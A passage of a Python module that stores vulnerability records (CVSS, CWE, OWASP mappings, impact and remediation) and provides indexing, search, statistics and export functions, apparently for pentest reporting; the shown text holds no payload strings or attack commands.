         category=Category.CLOUD, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
         cwe="CWE-284", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-661", av=AttackVector.NETWORK,
         desc="A DNS CNAME record points to a deprovisioned third-party service, allowing an attacker to claim it and serve content under the trusted subdomain.",
         impact="Convincing phishing and cookie/session theft from a fully trusted first-party subdomain.",
         rec="Remove DNS records immediately when decommissioning any third-party-backed subdomain; audit DNS zones for dangling CNAMEs.",
         tags=["subdomain-takeover","dns","cloud"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="LOGGING-001", title="Insufficient Logging and Monitoring", aliases=["Missing Security Logging"],
         category=Category.CONFIGURATION, severity=Severity.LOW, cvss=3.7, vector="AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L",
         cwe="CWE-778", owasp="A09:2021-Security Logging and Monitoring Failures", capec="CAPEC-N/A", av=AttackVector.NETWORK,
         desc="Authentication failures, access-control violations, and other security-relevant events are not logged or monitored.",
         impact="Extended attacker dwell time and delayed incident response.",
         rec="Log all authentication and authorization decisions, high-value transactions, and input-validation failures; route logs to a monitored SIEM.",
         tags=["logging","monitoring","hardening"], confidence="Tentative", exploit=Exploitability.THEORETICAL),
]


def _build_vulnerability(raw: dict) -> Vulnerability:
    """Materialise a compact raw record into a fully-populated Vulnerability."""
    category: Category = raw["category"]
    severity: Severity = raw["severity"]
    exploitability: Exploitability = raw["exploit"]
    payloads_raw: list[str] = (
        raw["payloads"] if raw.get("payloads") is not None else _payloads(raw.get("payload_key"))
    )
    rich_payloads: list[PayloadRecord] = _build_rich_payloads(raw.get("payload_key"))
    return Vulnerability(
        id=raw["id"], title=raw["title"],
        aliases=list(raw.get("aliases", [])),
        category=category, severity=severity,
        cvss=float(raw["cvss"]), cvss_vector=raw["vector"],
        cwe=raw["cwe"], owasp=raw["owasp"], capec=raw["capec"],
        attack_vector=raw["av"],
        description=raw["desc"], impact=raw["impact"],
        recommendation=raw["rec"],
        references=_refs(raw["cwe"], raw["owasp"], raw.get("extra_refs")),
        payloads=payloads_raw, tags=list(raw.get("tags", [])),
        confidence=raw.get("confidence", "Tentative"),
        exploitability=exploitability,
        framework_notes=_framework_notes(category),
        business_impact=_business_impact(severity),
        false_positive_notes=_fp_notes(category),
        detection_notes=_detection_notes(category),
        related_vulnerabilities=list(raw.get("related", [])),
        # v2 extensions
        rich_payloads=rich_payloads,
        affected_frameworks=_affected_frameworks(category),
        business_risk=BusinessRisk(
            affected_assets=[], business_risk=_business_impact(severity),
            likelihood="High" if severity in (Severity.CRITICAL, Severity.HIGH) else "Medium",
            attacker_value="Critical" if severity == Severity.CRITICAL else "High" if severity == Severity.HIGH else "Medium",
            compliance_mapping=_compliance(category),
        ),
        detection_intel=_detection_intel(category),
        exploit_intel=_exploit_intel(exploitability),
        compliance=_compliance(category),
        remediation_effort=(
            "Very High" if exploitability == Exploitability.TRIVIAL else
            "High" if severity == Severity.CRITICAL else "Medium"
        ),
    )


# ======================================================================
# KNOWLEDGE BASE CLASS
# ======================================================================


def _remove_from_list(lst: list[str], value: str) -> None:
    """Remove all occurrences of value from lst in-place."""
    try:
        while True:
            lst.remove(value)
    except ValueError:
        pass


def _fuzzy_match(query: str, texts: list[str]) -> bool:
    """Return True if the query shares >=60% of its characters as a subsequence in any text."""
    if not query:
        return False
    for text in texts:
        text_l = text.lower()
        idx = 0
        matched = 0
        for ch in query:
            pos = text_l.find(ch, idx)
            if pos != -1:
                matched += 1
                idx = pos + 1
        if matched / len(query) >= 0.6:
            return True
    return False


def _yaml_scalar(value: str) -> str:
    """Quote a string for YAML output if it contains special characters."""
    if any(ch in value for ch in (':', '#', '[', ']', '{', '}', '>', '|', '!', '"', "'")):
        escaped = value.replace("'", "''")
        return f"'{escaped}'"
    return value


class KnowledgeBase:
    """
    In-memory, fully-indexed vulnerability intelligence store.

    All v1 public methods are preserved with identical signatures.
    v2 additions are additive only.

    Indexes are rebuilt atomically on every register() call, providing
    O(1) lookups for severity, category, CWE, OWASP, CAPEC, tag, alias,
    and framework queries.
    """

    def __init__(self) -> None:
        self._store: dict[str, Vulnerability] = {}
        # O(1) indexes
        self._alias_index: dict[str, str] = {}
        self._by_severity: dict[Severity, list[str]] = {s: [] for s in Severity}
        self._by_category: dict[Category, list[str]] = {c: [] for c in Category}
        self._by_cwe: dict[str, list[str]] = defaultdict(list)
        self._by_owasp: dict[str, list[str]] = defaultdict(list)
        self._by_capec: dict[str, list[str]] = defaultdict(list)
        self._by_tag: dict[str, list[str]] = defaultdict(list)
        self._by_framework: dict[str, list[str]] = defaultdict(list)
        self._framework_profiles: dict[str, FrameworkProfile] = dict(_FRAMEWORK_PROFILES)
        self._loaded = False
        self._load()

    # ------------------------------------------------------------------ loading

    def _load(self) -> None:
        if self._loaded:
            return
        for raw in _RAW_VULNERABILITIES:
            try:
                vuln = _build_vulnerability(raw)
                self.register(vuln)
            except Exception:
                logger.exception("Failed to build vulnerability record for id=%s", raw.get("id"))
        self._loaded = True
        logger.info("KnowledgeBase loaded %d vulnerability records", len(self._store))

    # ------------------------------------------------------------------ registration

    def register(self, vuln: Vulnerability) -> None:
        """
        Register (or overwrite) a vulnerability record.

        All O(1) indexes are updated automatically on every call.
        Existing records with the same ID are first de-indexed.
        """
        vid = vuln.id
        if vid in self._store:
            logger.warning("Overwriting existing vulnerability id=%s", vid)
            self._deindex(self._store[vid])

        self._store[vid] = vuln
        self._alias_index[vuln.title.lower()] = vid
        for alias in vuln.aliases:
            self._alias_index[alias.lower()] = vid
        self._by_severity[vuln.severity].append(vid)
        self._by_category[vuln.category].append(vid)
        self._by_cwe[vuln.cwe.lower()].append(vid)
        owasp_key = vuln.owasp.lower()
        self._by_owasp[owasp_key].append(vid)
        prefix = owasp_key.split("-")[0].strip()
        if prefix != owasp_key:
            self._by_owasp[prefix].append(vid)
        self._by_capec[vuln.capec.lower()].append(vid)
        for tag in vuln.tags:
            self._by_tag[tag.lower()].append(vid)
        for fw in vuln.affected_frameworks:
            self._by_framework[fw.lower()].append(vid)

    def _deindex(self, vuln: Vulnerability) -> None:
        """Remove a record's entries from all indexes before overwrite."""
        vid = vuln.id
        self._alias_index.pop(vuln.title.lower(), None)
        for alias in vuln.aliases:
            self._alias_index.pop(alias.lower(), None)
        _remove_from_list(self._by_severity[vuln.severity], vid)
        _remove_from_list(self._by_category[vuln.category], vid)
        _remove_from_list(self._by_cwe[vuln.cwe.lower()], vid)
        _remove_from_list(self._by_owasp[vuln.owasp.lower()], vid)
        _remove_from_list(self._by_capec[vuln.capec.lower()], vid)
        for tag in vuln.tags:
            _remove_from_list(self._by_tag[tag.lower()], vid)
        for fw in vuln.affected_frameworks:
            _remove_from_list(self._by_framework[fw.lower()], vid)

    # ------------------------------------------------------------------ direct lookup (v1)

    def get(self, vuln_id: str) -> Optional[Vulnerability]:
        """Return the vulnerability with the given canonical ID, or None."""
        return self._store.get(vuln_id)

    def exists(self, vuln_id: str) -> bool:
        """Return True if the given canonical ID is registered."""
        return vuln_id in self._store

    def all(self) -> list[Vulnerability]:
        """Return every registered vulnerability."""
        return list(self._store.values())

    def count(self) -> int:
        """Return the total number of registered vulnerabilities."""
        return len(self._store)

    # ------------------------------------------------------------------ alias / search (v1 + v2)

    def search_alias(self, alias: str) -> Optional[Vulnerability]:
        """Look up a vulnerability by exact title or alias match (case-insensitive)."""
        vuln_id = self._alias_index.get(alias.strip().lower())
        return self._store.get(vuln_id) if vuln_id else None

    def search(
        self,
        query: str,
        *,
        use_regex: bool = False,
        fuzzy: bool = False,
        fields: Optional[list[str]] = None,
    ) -> list[Vulnerability]:
        """
        Search the knowledge base.

        Parameters
        ----------
        query:      Search term (plain partial-match by default).
        use_regex:  Compile query as a case-insensitive regex.
        fuzzy:      Include results with >=60% character-overlap heuristic.
        fields:     Restrict to specific fields:
                    'id', 'title', 'aliases', 'description',
                    'cwe', 'owasp', 'capec', 'tags'.
                    Default = all fields.

        Returns
        -------
        list[Vulnerability] ordered: exact → partial-primary → secondary hits.
        """
        q = query.strip()
        if not q:
            return []

        # Fast O(1) paths
        ql = q.lower()
        if ql.startswith("cwe-") and not use_regex and not fuzzy:
            return self._ids_to_vulns(self._by_cwe.get(ql, []))
        if re.match(r"^a\d\d:20\d\d", q, re.IGNORECASE) and not use_regex and not fuzzy:
            return self._ids_to_vulns(self._by_owasp.get(ql, []))
        if ql.startswith("capec-") and not use_regex and not fuzzy:
            return self._ids_to_vulns(self._by_capec.get(ql, []))

        _all_fields = {"id", "title", "aliases", "description", "cwe", "owasp", "capec", "tags"}
        active_fields = set(fields) & _all_fields if fields else _all_fields

        if use_regex:
            try:
                pattern = re.compile(q, re.IGNORECASE)
            except re.error as exc:
                logger.warning("Invalid regex '%s': %s", q, exc)
                return []
            _matcher_fn = pattern.search
        else:
            _matcher_fn = None

        exact: list[Vulnerability] = []
        partial_primary: list[Vulnerability] = []
        partial_secondary: list[Vulnerability] = []
        seen: set[str] = set()

        for vuln in self._store.values():
            if vuln.id in seen:
                continue

            primary: list[str] = []
            secondary: list[str] = []

            if "id" in active_fields:
                primary.append(vuln.id)
            if "title" in active_fields:
                primary.append(vuln.title)
            if "aliases" in active_fields:
                primary.extend(vuln.aliases)
            if "description" in active_fields:
                secondary.append(vuln.description)
            if "cwe" in active_fields:
                secondary.append(vuln.cwe)
            if "owasp" in active_fields:
                secondary.append(vuln.owasp)
            if "capec" in active_fields:
                secondary.append(vuln.capec)
            if "tags" in active_fields:
                secondary.extend(vuln.tags)

            if not use_regex:
                if any(ql == t.lower() for t in primary):
                    exact.append(vuln); seen.add(vuln.id)
                elif any(ql in t.lower() for t in primary):
                    partial_primary.append(vuln); seen.add(vuln.id)
                elif any(ql in t.lower() for t in secondary):
                    partial_secondary.append(vuln); seen.add(vuln.id)
                elif fuzzy and _fuzzy_match(ql, primary + secondary):
                    partial_secondary.append(vuln); seen.add(vuln.id)
            else:
                if any(_matcher_fn(t) for t in primary):
                    partial_primary.append(vuln); seen.add(vuln.id)
                elif any(_matcher_fn(t) for t in secondary):
                    partial_secondary.append(vuln); seen.add(vuln.id)

        return exact + partial_primary + partial_secondary

    # ------------------------------------------------------------------ O(1) filters (v1 + v2)

    def filter_by_severity(self, severity: Severity) -> list[Vulnerability]:
        """Return all vulnerabilities matching the given severity (O(1) index)."""
        return self._ids_to_vulns(self._by_severity[severity])

    def filter_by_category(self, category: Category) -> list[Vulnerability]:
        """Return all vulnerabilities matching the given category (O(1) index)."""
        return self._ids_to_vulns(self._by_category[category])

    def filter_by_cwe(self, cwe: str) -> list[Vulnerability]:
        """Return all vulnerabilities matching the given CWE ID (O(1) index)."""
        return self._ids_to_vulns(self._by_cwe.get(cwe.strip().lower(), []))

    def filter_by_owasp(self, owasp: str) -> list[Vulnerability]:
        """
        Return all vulnerabilities matching the given OWASP category.
        Accepts full strings ('A03:2021-Injection') or leading tokens ('A03:2021').
        Falls back to partial scan if the exact key is not in the index.
        """
        target = owasp.strip().lower()
        if target in self._by_owasp:
            return self._ids_to_vulns(self._by_owasp[target])
        seen: set[str] = set()
        results: list[Vulnerability] = []
        for key, ids in self._by_owasp.items():
            if target in key:
                for vid in ids:
                    if vid not in seen and vid in self._store:
                        results.append(self._store[vid])
                        seen.add(vid)
        return results

    def filter_by_capec(self, capec: str) -> list[Vulnerability]:
        """Return all vulnerabilities matching the given CAPEC ID (O(1) index)."""
        return self._ids_to_vulns(self._by_capec.get(capec.strip().lower(), []))

    def filter_by_tag(self, tag: str) -> list[Vulnerability]:
        """Return all vulnerabilities carrying the given tag (O(1) index)."""
        return self._ids_to_vulns(self._by_tag.get(tag.strip().lower(), []))

    def filter_by_framework(self, framework: str) -> list[Vulnerability]:
        """Return all vulnerabilities mapped to the given framework (O(1) index)."""
        return self._ids_to_vulns(self._by_framework.get(framework.strip().lower(), []))

    # ------------------------------------------------------------------ convenience accessors (v1)

    def payloads(self, vuln_id: str) -> list[str]:
        """Return the raw payload list for a given vulnerability ID (empty if unknown)."""
        vuln = self.get(vuln_id)
        return list(vuln.payloads) if vuln else []

    def recommendation(self, vuln_id: str) -> str:
        """Return the remediation recommendation text for a given vulnerability ID."""
        vuln = self.get(vuln_id)
        return vuln.recommendation if vuln else ""

    def impact(self, vuln_id: str) -> str:
        """Return the impact description for a given vulnerability ID."""
        vuln = self.get(vuln_id)
        return vuln.impact if vuln else ""

    # ------------------------------------------------------------------ v2 helpers

    def best_payload(self, vuln_id: str) -> Optional[PayloadRecord]:
        """
        Return the highest-confidence, easiest-difficulty PayloadRecord for
        a vulnerability, or None if no rich payloads are registered.
        """
        vuln = self.get(vuln_id)
        if not vuln or not vuln.rich_payloads:
            return None
        _order = {"Trivial": 0, "Easy": 1, "Moderate": 2, "Difficult": 3}
        return min(vuln.rich_payloads, key=lambda p: _order.get(p.difficulty, 9))

    def frameworks(self) -> list[FrameworkProfile]:
        """Return all registered FrameworkProfile objects sorted by name."""
        return sorted(self._framework_profiles.values(), key=lambda f: f.name)

    def framework_count(self) -> int:
        """Return the number of registered framework profiles."""
        return len(self._framework_profiles)

    def top_critical(self, n: int = 10) -> list[Vulnerability]:
        """Return up to n Critical-severity vulnerabilities, highest CVSS first."""
        crits = self.filter_by_severity(Severity.CRITICAL)
        return sorted(crits, key=lambda v: v.cvss, reverse=True)[:n]

    def top_by_cvss(self, n: int = 10) -> list[Vulnerability]:
        """Return up to n vulnerabilities with the highest CVSS scores."""
        return sorted(self._store.values(), key=lambda v: v.cvss, reverse=True)[:n]

    def related(self, vuln_id: str) -> list[Vulnerability]:
        """Return all vulnerabilities listed as related to the given ID."""
        vuln = self.get(vuln_id)
        if not vuln:
            return []
        return [v for v in (self.get(rid) for rid in vuln.related_vulnerabilities) if v is not None]

    def similar(self, vuln_id: str, max_results: int = 5) -> list[Vulnerability]:
        """
        Return up to max_results vulnerabilities similar to the given ID,
        ranked by shared tag count then by shared category.
        """
        vuln = self.get(vuln_id)
        if not vuln:
            return []
        own_tags = set(vuln.tags)
        candidates = [v for v in self._store.values() if v.id != vuln_id and v.category == vuln.category]
        candidates.sort(key=lambda v: len(set(v.tags) & own_tags), reverse=True)
        return candidates[:max_results]

    def search_payload(self, query: str) -> list[tuple[str, str]]:
        """
        Search for a string within all payload strings.
        Returns list of (vuln_id, matching_payload) tuples.
        """
        q = query.lower()
        return [
            (vuln.id, p)
            for vuln in self._store.values()
            for p in vuln.payloads
            if q in p.lower()
        ]

    def search_reference(self, query: str) -> list[tuple[str, str]]:
        """
        Search for a URL or string within all reference lists.
        Returns list of (vuln_id, matching_reference) tuples.
        """
        q = query.lower()
        return [
            (vuln.id, ref)
            for vuln in self._store.values()
            for ref in vuln.references
            if q in ref.lower()
        ]

    def payload_count(self) -> int:
        """Return the total number of payload strings across all vulnerabilities."""
        return sum(len(v.payloads) for v in self._store.values())

    # ------------------------------------------------------------------ statistics (v1 + v2)

    def statistics(self) -> dict:
        """
        Return comprehensive aggregate statistics.
        Includes severity/category distributions, CVSS analytics,
        OWASP/CWE/framework coverage counts, and payload summary.
        """
        all_cvss = [v.cvss for v in self._store.values()]
        avg_cvss = round(sum(all_cvss) / len(all_cvss), 2) if all_cvss else 0.0
        max_cvss = max(all_cvss) if all_cvss else 0.0
        by_severity: dict[str, int] = {sev.value: len(ids) for sev, ids in self._by_severity.items()}
        by_category: dict[str, int] = {cat.value: len(ids) for cat, ids in self._by_category.items()}
        by_owasp: dict[str, int] = {k: len(v) for k, v in self._by_owasp.items() if v}
        owasp_unique = len({v.owasp for v in self._store.values()})
        cwe_ids = {v.cwe for v in self._store.values()}
        fw_coverage = {fw: len(ids) for fw, ids in self._by_framework.items() if ids}
        return {
            "total": self.count(),
            "by_severity": by_severity,
            "by_category": by_category,
            "by_owasp": by_owasp,
            "owasp_unique_categories": owasp_unique,
            "cwe_unique": len(cwe_ids),
            "cwe_coverage": sorted(cwe_ids),
            "framework_coverage": fw_coverage,
            "framework_profiles": self.framework_count(),
            "payload_total": self.payload_count(),
            "avg_cvss": avg_cvss,
            "max_cvss": max_cvss,
        }

    # ------------------------------------------------------------------ export (v1 preserved + v2 additions)

    def export_dict(self) -> list[dict]:
        """Export every vulnerability as a list of plain dictionaries (v1 fields only)."""
        return [
            {
                "id": v.id, "title": v.title, "aliases": v.aliases,
                "category": v.category.value, "severity": v.severity.value,
                "cvss": v.cvss, "cvss_vector": v.cvss_vector,
                "cwe": v.cwe, "owasp": v.owasp, "capec": v.capec,
                "attack_vector": v.attack_vector.value,
                "description": v.description, "impact": v.impact,
                "recommendation": v.recommendation,
                "references": v.references, "payloads": v.payloads,
                "tags": v.tags, "confidence": v.confidence,
                "exploitability": v.exploitability.value,
                "framework_notes": v.framework_notes,
                "business_impact": v.business_impact,
                "false_positive_notes": v.false_positive_notes,
                "detection_notes": v.detection_notes,
                "related_vulnerabilities": v.related_vulnerabilities,
            }
            for v in self._store.values()
        ]

    def export_json(self, indent: int = 2) -> str:
        """Export every vulnerability as a JSON-formatted string (v1 fields)."""
        return json.dumps(self.export_dict(), indent=indent, ensure_ascii=False)

    def export_dict_v2(self) -> list[dict]:
        """Export every vulnerability as a list of fully-populated v2 dictionaries."""
        return [v.to_dict() for v in self._store.values()]

    def export_json_v2(self, indent: int = 2) -> str:
        """Export every vulnerability as JSON including all v2 fields."""
        return json.dumps(self.export_dict_v2(), indent=indent, ensure_ascii=False)

    def export_yaml(self) -> str:
        """
        Export every vulnerability in YAML format (no external dependency).
        Uses a minimal hand-rolled serialiser. For production use with
        complex objects, install PyYAML and replace with yaml.dump().
        """
        lines: list[str] = ["---", "vulnerabilities:"]
        for vuln in self._store.values():
            lines.append(f"  - id: {_yaml_scalar(vuln.id)}")
            lines.append(f"    title: {_yaml_scalar(vuln.title)}")
            lines.append(f"    severity: {vuln.severity.value}")
            lines.append(f"    cvss: {vuln.cvss}")
            lines.append(f"    cwe: {vuln.cwe}")
            lines.append(f"    owasp: {_yaml_scalar(vuln.owasp)}")
            lines.append(f"    category: {_yaml_scalar(vuln.category.value)}")
            lines.append(f"    exploitability: {vuln.exploitability.value}")
            lines.append(f"    confidence: {vuln.confidence}")
            lines.append("    tags:")
            for tag in vuln.tags:
                lines.append(f"      - {_yaml_scalar(tag)}")
            lines.append("    payloads:")
            for p in vuln.payloads:
                lines.append(f"      - {_yaml_scalar(p)}")
            lines.append("    affected_frameworks:")
            for fw in vuln.affected_frameworks:
                lines.append(f"      - {_yaml_scalar(fw)}")
            lines.append("    compliance:")
            lines.append(f"      pci_dss: {vuln.compliance.pci_dss}")
            lines.append(f"      owasp_asvs: {vuln.compliance.owasp_asvs}")
        return "\n".join(lines)

    def export_markdown(self) -> str:
        """
        Export a Markdown summary report grouped by severity,
        formatted for inclusion in a pentest report.
        """
        stats = self.statistics()
        md: list[str] = [
            "# Vulnerability Knowledge Base Report", "",
            "## Summary Statistics", "",
            "| Metric | Value |",
            "|--------|-------|",
            f"| Total Vulnerabilities | {stats['total']} |",
            f"| Average CVSS | {stats['avg_cvss']} |",
            f"| Maximum CVSS | {stats['max_cvss']} |",
            f"| Unique CWEs | {stats['cwe_unique']} |",
            f"| OWASP Categories Covered | {stats['owasp_unique_categories']} |",
            f"| Framework Profiles | {stats['framework_profiles']} |",
            f"| Total Payload Strings | {stats['payload_total']} |",
            "",
        ]
        for sev in [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.INFO]:
            vulns = self.filter_by_severity(sev)
            if not vulns:
                continue
            md.append(f"## {sev.value} Severity Findings ({len(vulns)})")
            md.append("")
            md.append("| ID | Title | CVSS | CWE | OWASP |")
            md.append("|----|-------|------|-----|-------|")
            for v in sorted(vulns, key=lambda x: x.cvss, reverse=True):
                md.append(f"| {v.id} | {v.title} | {v.cvss} | {v.cwe} | {v.owasp} |")
            md.append("")
        return "\n".join(md)

    def export_csv(self) -> str:
        """Export all vulnerabilities as a CSV string (v1 core fields)."""
        output = io.StringIO()
        fieldnames = [
            "id", "title", "severity", "cvss", "cwe", "owasp", "capec",
            "category", "exploitability", "confidence", "attack_vector",
            "tags", "affected_frameworks", "related_vulnerabilities",
        ]
        writer = csv.DictWriter(output, fieldnames=fieldnames, extrasaction="ignore")
        writer.writeheader()
        for v in self._store.values():
            writer.writerow({
                "id": v.id, "title": v.title,
                "severity": v.severity.value, "cvss": v.cvss,
                "cwe": v.cwe, "owasp": v.owasp, "capec": v.capec,
                "category": v.category.value,
                "exploitability": v.exploitability.value,
                "confidence": v.confidence,
                "attack_vector": v.attack_vector.value,
                "tags": "|".join(v.tags),
                "affected_frameworks": "|".join(v.affected_frameworks),
                "related_vulnerabilities": "|".join(v.related_vulnerabilities),
            })
        return output.getvalue()

    # ------------------------------------------------------------------ internal

    def _ids_to_vulns(self, ids: list[str]) -> list[Vulnerability]:
        return [self._store[vid] for vid in ids if vid in self._store]


# ======================================================================
# GLOBAL SINGLETON
# ======================================================================

KB = KnowledgeBase()


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    stats = KB.statistics()
    logger.info(
        "KnowledgeBase v2 | %d vulns | avg CVSS %.2f | %d frameworks | %d payloads | %d CWEs",
        stats["total"], stats["avg_cvss"], stats["framework_profiles"],
        stats["payload_total"], stats["cwe_unique"],
    )
